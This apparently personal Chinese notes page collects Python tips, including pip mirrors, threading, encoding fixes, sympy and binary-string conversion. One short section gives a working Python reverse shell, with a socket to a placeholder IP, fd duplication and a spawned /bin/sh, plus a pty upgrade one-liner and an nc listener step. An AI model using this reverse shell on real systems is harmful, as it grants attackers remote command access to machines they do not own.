# 写在前面

嗯哼，Python很好玩呢...记录一点黑科技咯

当你尝试一个包的时候，注意自己的py文件名称不能与包名重名，例如不要出现flask.py

----

# 设置pip源

```bash
mkdir -p ~/.pip
echo """
[global]
index-url = http://pypi.doubanio.com/simple/
[install]
trusted-host=pypi.doubanio.com
""">~/.pip/pip.conf
```

# 反弹shell

首先自己的服务器上用**nc -l 端口**

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(( "IP地址" , 端口 ))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

## 获得一个tty

    python -c 'import pty; pty.spawn("/bin/sh")'

----

# 让requests使用多个IP

```python
import socket
real_create_conn = socket.create_connection
def set_src_addr(*args):
    address, timeout = args[0], args[1]
    source_address = ( 需要使用的IP , 0)
    return real_create_conn(address, timeout, source_address)
socket.create_connection = set_src_addr
import requests
```

----

# Python多线程模板

[MultiThread_Template.py](code/MultiThread_Template.py)

## BaseHTTPServer并发性改善

> 参考资料：[利用Python中SocketServer 实现客户端与服务器间非阻塞通信](http://blog.csdn.net/cnmilan/article/details/9664823)

> 直接修改BaseHTTPServer的代码中的一个细节，可以大幅度提高使用BaseHTTPServer能支持的并发性

首先找到BaseHTTPServer在哪：

     python -c "import BaseHTTPServer; print(BaseHTTPServer)"

修改对应的文件，如/usr/lib/python2.7/BaseHTTPServer.py

找到这行：

```python
class HTTPServer(SocketServer.TCPServer):
```

修改其继承的父类：

```python
class HTTPServer(SocketServer.ThreadingTCPServer):
```

----

## 无root权限安装Python

下载最新版python源码后指定prefix编译，假设用户目录为/home/chenyuan

```
apt-get install libssl-dev openssl 
curl -O https://www.python.org/ftp/python/3.5.2/Python-3.5.2.tgz
tar -xzf Python-3.5.2.tgz
cd Python-3.5.2/
./configure --prefix=/home/chenyuan/python3
make
make install >/dev/null
pushd /home/chenyuan/python3/bin
cp python3 python
cp pip3 pip
alias python3=`pwd`/python
alias pip3=`pwd`/pip
```

----

# 中文输出乱码问题

方法1：运行py前设置环境变量

```bash
export PYTHONIOENCODING=utf8
```

方法2：强制修改stdout

```
import sys
sys.stdout=open(1, 'w', encoding='utf-8', closefd=False)
```

----

# 遵循PEP8检查你的代码

[pycodestyle](https://github.com/PyCQA/pycodestyle)

安装并使用pycodestyle检查代码，忽略E501一行不能长于80个字符的限制：

```
pip install pycodestyle
pycodestyle --show-source --ignore=E501 yourcode.py
```

----

# 生成随机字符串

```
from random import Random
def random_str(randomlength=8):
    str = ''
    chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
    length = len(chars) - 1
    random = Random()
    for i in range(randomlength):
        str+=chars[random.randint(0, length)]
    return str
````

----

# Python解方程

需要 `pip install sympy`

```
from sympy import *
# 解一元方程：
#   2x^2-18=0
x=Symbol('x')
print(solve(2*x**2-18,x))
# 得到[-3,3]

# 解方程组
#   y=1-x
#   3x+2y-5
x,y=symbols('x y')
print(solve([ y-1+x, 3*x+2*y-5 ], [ x , y ]))
# 得到{x: 3, y: -2}
```

----

# 大数据判断in

一定要用set，因为set的in操作是O(1)的，用list是O(n)速度太慢

----

# 解决Python.h: No such file or directory

```
apt-get install -y python-dev python3-dev
```

如果为CentOS系统：

```
yum install python-devel
```

----

# 二进制字符串转普通字符串

方法一：将字符串每8个分成一组，用int转10进制，再用chr转为ascii字符

```
s="0110001101111001"
ans=""
for i in range(0,len(s)//8):
    x = s[i*8:i*8+8]
    ans+=chr(int(x,2))
```

方法二：利用binascii，先用int转为10进制，然后转为16进制字符串，调用unhexlify执行翻译

```
import binascii
s="0110001101111001"
ans=binascii.unhexlify('%x'%int(s,2))
```

----

# 用Python3写PAT心得

* 如果发生格式错误，检查输出的最后一行的print，加上end=""表示不要换行

* 如果数据规模大导致超时，代码中的in操作前先把list转为set，能大幅度提速
